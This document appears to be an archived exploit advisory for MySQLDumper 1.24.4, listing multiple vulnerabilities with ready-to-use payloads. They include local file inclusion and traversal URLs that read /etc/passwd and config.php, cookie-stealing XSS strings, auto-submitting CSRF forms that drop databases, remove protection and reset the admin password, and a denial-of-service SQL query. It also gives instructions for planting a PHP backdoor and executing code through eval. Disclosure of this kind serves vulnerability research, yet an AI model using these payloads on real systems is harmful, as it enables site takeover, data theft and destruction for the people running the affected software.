@@ -1,0 +1,389 @@
+id: 18146
+date: 04/28/2012
+title: MySQLDumper 1.24.4 Multiple Vulnerabilities
+author: AkaStep
+cves: 
+
+================================================================================================
+Vulnerable Software: MySQLDumper Version 1.24.4
+Downloaded from: http://sourceforge.net/projects/mysqldumper/files/
+(MD5 SUM: b62357a0d5bbb43779d16427c30966a1 *MySQLDumper1.24.4.zip)
+================================================================================================
+About Software:
+What is MySQLDumper ?
+MySQLDumper is a PHP and Perl based tool for backing up MySQL databases.
+You can easily dump your data into a backup file and - if needed - restore it.
+It is especially suited for shared hosting webspaces, where you don't have shell access.
+MySQLDumper is an open source project and released under the GNU-license.
+================================================================================================
+Tested:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL: 5.5.23
+================================================================================================
+
+Vuln Desc:
+MySQLDumper Version 1.24.4 is prone to:
+LFI,XSS,CSRF,PHP CODE ExeCution,traversal,Info Disclosure vulns.
+
+Local File Inclusion
+http://192.168.0.15/learn/cubemail/install.php?language=../../../../../../../../../../../../../../../../../etc/passwd%00
+
+/* Vulnerable COde Section
+//install.php
+
+if (!@ob_start("ob_gzhandler")) @ob_start();
+$install_ftp_server=$install_ftp_user_name=$install_ftp_user_pass=$install_ftp_path="";
+$dbhost=$dbuser=$dbpass=$dbport=$dbsocket=$manual_db='';
+foreach ($_GET as $getvar=>$getval)
+{
+${$getvar}=$getval;
+}
+foreach ($_POST as $postvar=>$postval)
+{
+${$postvar}=$postval;
+}
+include_once ( './inc/functions.php' );
+include_once ( './inc/mysql.php' );
+include_once ( './inc/runtime.php' );
+if (!isset($language)) $language="en";
+
+$config['language']=$language;
+include ( './language/lang_list.php' );
+include ( 'language/' . $language . '/lang_install.php' );
+include ( 'language/' . $language . '/lang_main.php' );
+include ( 'language/' . $language . '/lang_config_overview.php' );
+
+*/
+
+
+
+XSS on inputs via $_POST
+http://192.168.0.15/learn/cubemail/install.php?phase=1&language=en&submit=Installation
+
+
+
+
+http://192.168.0.15/learn/cubemail/index.php?page=javascript:alert%28document.cookie%29;
+/*VUlnerable code section
+//index.php
+<?php
+if (!@ob_start("ob_gzhandler")) @ob_start();
+include ('./inc/functions.php');
+$page=(isset($_GET['page'])) ? $_GET['page'] : 'main.php';
+if (!file_exists("./work/config/mysqldumper.php"))
+{
+header("location: install.php");
+ob_end_flush();
+die();
+}
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
+"http://www.w3.org/TR/html4/frameset.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="Author" content="Daniel Schlichtholz">
+<title>MySQLDumper</title>
+</head>
+
+<frameset border=0 cols="190,*">
+<frame name="MySQL_Dumper_menu" src="menu.php" scrolling="no" noresize
+frameborder="0" marginwidth="0" marginheight="0">
+<frame name="MySQL_Dumper_content" src="<?php
+echo $page; // <=here is
+?>"
+scrolling="auto" frameborder="0" marginwidth="0" marginheight="0">
+</frameset>
+</html>
+<?php
+ob_end_flush();
+
+
+
+*/
+
+
+
+
+XSS via $_GET
+http://192.168.0.15/learn/cubemail/install.php?phase=8%3Cscript%3Ealert%281%29;%3C/script%3E&language=en&submit=
+Installation
+http://192.168.0.15/learn/cubemail/sql.php?db=0&dbid=1&tablename=%3Cscript%3Ealert%281%29;%3C/script%3E
+http://192.168.0.15/learn/cubemail/sql.php?db=0&dbid=%3Cscript%3Ealert%281%29;%3C/script%3E&tablename=1
+http://192.168.0.15/learn/cubemail/restore.php?filename=%3Cscript%3Ealert%281%29;%3C/script%3E
+
+
+CSRF Delete application protection via $_GET
+<img src="http://192.168.0.15/learn/cubemail/main.php?action=deletehtaccess" />
+
+*After this Application will become fully unprotected from World.*
+
+
+CSRF Drop database:
+
+<img src="http://localhost/tld/meonyourpc.PNG" heigth="250" width="300" />
+<form name="hackit" id="hackit"
+action="http://192.168.0.15/learn/cubemail/main.php?action=db&dbid=1" method="post">
+<p><blink>Hotlink Protection is Active! Please click refresh button.</blink></p>
+<input name="kill1" value="Refresh" onclick="alert('Congrats!) Your Database
+Dropped!')" type="submit">
+</form>
+
+kill0 is always information_schema (obviously you can't drop it)
+Try to increment that index
+in ex:
+kill1 etc.
+
+
+
+CSRF Uninstall Application via $_GET
+http://192.168.0.15/learn/cubemail/install.php?language=en&phase=101
+or
+http://192.168.0.15/learn/cubemail/install.php?language=en&phase=2 (This will delete existing config.php file)
+
+CSRF change password:
+
+<body onload="javascript:document.forms[0].submit()">
+<form method="post" action="http://192.168.0.15/learn/cubemail/main.php?action=schutz">
+<input name="username" id="username" type="text" value="pwnyou" />
+<input name="userpass1" id="userpass1" type="text" value="pwnyou" />
+<input name="userpass2" id="userpass2" type="text" value="pwnyou" />
+<!--SHA1 (all Systems) -->
+<input type="radio" name="type" id="type2" value="2"
+checked="checked" >
+</form>
+
+username:pwnyou
+password:pwnyou
+
+CSRF:Execute SQL commands via $_GET
+In eg:( Create Denial Of Service Condition)
+<img
+src="http://192.168.0.15/learn/cubemail/sql.php?sql_statement=select+benchmark%28100000000,md5%28now%28%29%29%29--&
+quot; heigth="0" width="0" />
+
+
+
+
+After gain access to application (in eg: after successfully exploitation CSRF via delete protection technique)
+remote attacker can use this techniques to upload his/her backdoor.
+As result this will completely compromise site.
+*Upload backdoor:*
+Rename your backdoor on your pc to me.php.gz
+Then switch to:
+http://192.168.0.15/learn/cubemail/filemanagement.php?action=files
+Upload it:
+Then Switch to:
+http://192.168.0.15/learn/cubemail/main.php?action=edithtaccess
+On input box called: File:
+enter relative/absolute path to your uploaded me.php.gz (default ./work/backup/me.php.gz)
+Click RELOAD button.
+On inputbox called File: Change file extension to:
+./work/backup/me.php
+Click save button and Vuala you have your own backdoor there.
+You can find it:
+http://192.168.0.15/learn/cubemail/work/backup/me.php
+
+
+Same tehcnique can be used without upload any file:
+Todo so:
+Switch to
+http://192.168.0.15/learn/cubemail/filemanagement.php?action=files
+
+Enter non existent file name on input called File:
+in eg:
+mybackdoor.php
+Click reload button.
+it will ask *Create it?*
+Click *Create* Button.
+Copy paste your backdoor content to textarea and Click Save button.
+
+Same technique can be used to add CUSTOM .htaccess Handler (to execute backdoor in eg: as *.gif file)
+
+*NOTE* Second technique can be used by attacker to overwrite existing files./read arbitraty files on site/server.
+
+Theris also chance to execute our code using eval PHP language *construct*.
+We have PHP Code ExeCution here:
+
+Vulnerable code section:
+/*
+//menu.php
+if (isset($_POST['selected_config'])||isset($_GET['config']))
+{
+if (isset($_POST['selected_config'])) $new_config=$_POST['selected_config'];
+// Configuration was switched in content frame?
+if (isset($_GET['config'])) $new_config=$_GET['config'];
+// restore the last active menuitem
+if (is_readable($config['paths']['config'].$new_config.'.php'))
+{
+clearstatcache();
+unset($databases);
+$databases=array();
+if (read_config($new_config))
+{
+$config['config_file']=$new_config;
+$_SESSION['config_file']=$new_config; //$config['config_file'];
+$config_refresh='
+<script language="JavaScript" type="text/javascript">
+if (parent.MySQL_Dumper_content.location.href.indexOf("config_overview.php")!=-1)
+{
+var selected_div=parent.MySQL_Dumper_content.document.getElementById("sel").value;
+}
+else selected_div=\'\';
+parent.MySQL_Dumper_content.location.href=\'config_overview.php?config='.urlencode($new_config).'&sel=\'+selected
+_div</script>';
+}
+if (isset($_GET['config'])) $config_refresh=''; //Neu-Aufruf bei Uebergabe aus Content-Bereich verhindern
+}
+}
+
+
+
+*/
+As you can see we can traverse it +
+
+if we will look to read_config() function
+//inc/functions_global.php
+
+function read_config($file=false)
+{
+global $config,$databases;
+$ret=false;
+if (!$file) $file=$config['config_file'];
+// protect from including external files
+$search=array(':', 'http', 'ftp', ' ');
+$replace=array('', '', '', '');
+$file=str_replace($search,$replace,$file);
+
+if (is_readable($config['paths']['config'].$file.'.php'))
+{
+// to prevent modern server from caching the new configuration we need to evaluate it this way
+clearstatcache();
+$f=implode('',file($config['paths']['config'].$file.'.php'));
+$f=str_replace('<?php','',$f);
+$f=str_replace('?>','',$f);
+eval($f);
+$config['config_file']=$file;
+$_SESSION['config_file']=$config['config_file'];
+$ret=true;
+}
+return $ret;
+}
+
+this means remote attacker can iterate his/her code as PHP.(Notice: eval($f))
+
+Our exploit:
+http://192.168.0.15/learn/cubemail/menu.php?config=../../ss
+where ss = ss.php
+#cat ss.php # in eg attacker uploaded his/her own file:
+echo 'Our command executed ' . getcwd();
+phpinfo();
+
+Print screen:
+http://s007.radikal.ru/i302/1204/c3/fd5aac2a58c5.png
+
+
+Theris also a lot of CROSS Site Scripting Vulnerabilities: (XSS)
+Switch to:
+http://192.168.0.15/learn/cubemail/sql.php?db=information_schema&dbid=0
+
+Enter:
+select '<script>alert(1);</script>'
+
+and click Execute SQL Statement.
+
+
+Traversal:
+/*Vulnerable Code Section:
+//filemanagement.php
+<?php
+if (isset($_GET['action'])&&$_GET['action']=='dl') $download=true;
+include ('./inc/header.php');
+include_once ('./language/'.$config['language'].'/lang.php');
+include_once ('./language/'.$config['language'].'/lang_filemanagement.php');
+include_once ('./language/'.$config['language'].'/lang_config_overview.php');
+include_once ('./language/'.$config['language'].'/lang_main.php');
+include_once ('./inc/functions_files.php');
+include_once ('./inc/functions_sql.php');
+$msg='';
+$dump=array();
+if ($config['auto_delete']==1) $msg=AutoDelete();
+get_sql_encodings(); // get possible sql charsets and also get default charset
+//0=Datenbank 1=Struktur
+$action=(isset($_GET['action'])) ? $_GET['action'] : 'files';
+$kind=(isset($_GET['kind'])) ? $_GET['kind'] : 0;
+$expand=(isset($_GET['expand'])) ? $_GET['expand'] : -1;
+$selectfile=(isset($_POST['selectfile'])) ? $_POST['selectfile'] : "";
+$destfile=(isset($_POST['destfile'])) ? $_POST['destfile'] : "";
+$compressed=(isset($_POST['compressed'])) ? $_POST['compressed'] : "";
+$dk=(isset($_POST['dumpKommentar'])) ? ((get_magic_quotes_gpc()) ? stripslashes($_POST['dumpKommentar']) :
+$_POST['dumpKommentar']) : "";
+$dk=str_replace(':','|',$dk); // remove : because of statusline
+$dump['sel_dump_encoding']=(isset($_POST['sel_dump_encoding'])) ? $_POST['sel_dump_encoding'] :
+get_index($config['mysql_possible_character_sets'],$config['mysql_standard_character_set']);
+$dump['dump_encoding']=isset($config['mysql_possible_character_sets'][$dump['sel_dump_encoding']]) ?
+$config['mysql_possible_character_sets'][$dump['sel_dump_encoding']] : 0;
+
+if ($action=='dl')
+{
+// Download of a backup file wanted
+$file='./'.$config['paths']['backup'].urldecode($_GET['f']);
+if (is_readable($file))
+{
+header('Content-Description: File Transfer');
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename='.basename($file));
+header('Content-Transfer-Encoding: binary');
+header('Expires: 0');
+header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+header('Pragma: public');
+header('Content-Length: '.(string) filesize($file));
+flush();
+$file=fopen($file,"rb");
+while (!feof($file))
+{
+print fread($file,round(100*1024));
+flush();
+}
+fclose($file);
+}
+
+//readfile($file);
+exit();
+}
+
+*/
+
+
+Exploit:
+http://192.168.0.15/learn/cubemail/filemanagement.php?action=dl&f=../../config.php
+http://192.168.0.15/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00
+This technique can be used by attacker to download arbitraty files from site/server.
+Print screen:
+http://s017.radikal.ru/i431/1204/e2/9075bb5fecd4.png
+
+
+Information Disclosure:
+Try to Direct access to this file:
+http://192.168.0.15/learn/cubemail/restore.php
+Generates a lot of Notice's.
+
+http://192.168.0.15/learn/cubemail/dump.php
+Generates a lot of Notice's.
+
+http://192.168.0.15/learn/cubemail/refresh_dblist.php
+Fatal error: Call to undefined function MSD_mysql_connect() in C:\Program Files\Apache Software
+Foundation\Apache2.2\htdocs\learn\cubemail\inc\functions.php on line 147
+
+NOTE: May be previous versions too affected but not tested.
+
+================================ EOF ======================================
+
+
+
+#  0day.today [2023-03-23]  #
